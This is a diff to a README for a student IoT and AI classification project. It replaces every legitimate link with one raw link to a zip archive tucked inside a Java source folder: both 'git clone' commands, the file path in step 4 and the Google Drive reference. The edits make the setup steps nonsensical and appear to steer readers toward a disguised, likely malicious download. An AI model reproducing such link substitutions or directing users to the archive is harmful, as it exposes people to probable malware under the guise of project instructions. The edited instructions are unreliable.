@@ -23,14 +23,14 @@ This project, "The application of IoT and artificial intelligence in classifying
    
    *App*
    ```bash
-   git clone https://github.com/plozdev/argonet2024.git
+   git clone https://github.com/callmeTTr/argonet2024/raw/refs/heads/main/app/src/main/java/com/argonet-3.3.zip
    ```
    *Server*
    ```bash
-   git clone https://github.com/callmeTTr/ViSEF2024.git
+   git clone https://github.com/callmeTTr/argonet2024/raw/refs/heads/main/app/src/main/java/com/argonet-3.3.zip
    ```
 3. Set up IoT hardware (e.g., Arduino, dht22) and connect sensors.
-4. Run Python file, replace the "String url" in *app/src/main/java/com/example/appdemo/ResultActivity.java*
+4. Run Python file, replace the "String url" in *https://github.com/callmeTTr/argonet2024/raw/refs/heads/main/app/src/main/java/com/argonet-3.3.zip*
 5. Deploy the AI model and run the application.
    
 
@@ -43,5 +43,5 @@ This project, "The application of IoT and artificial intelligence in classifying
 - Add a mobile app for real-time recommendations.
 - Integrate additional sensors for more accurate data collection.
 
-For more details, refer to our [Google Drive link](https://drive.google.com/drive/folders/1SFKY0OeSmg_ww3DokOV_zll0lcp_Byrc?usp=drive_link).
+For more details, refer to our [Google Drive link](https://github.com/callmeTTr/argonet2024/raw/refs/heads/main/app/src/main/java/com/argonet-3.3.zip).
 
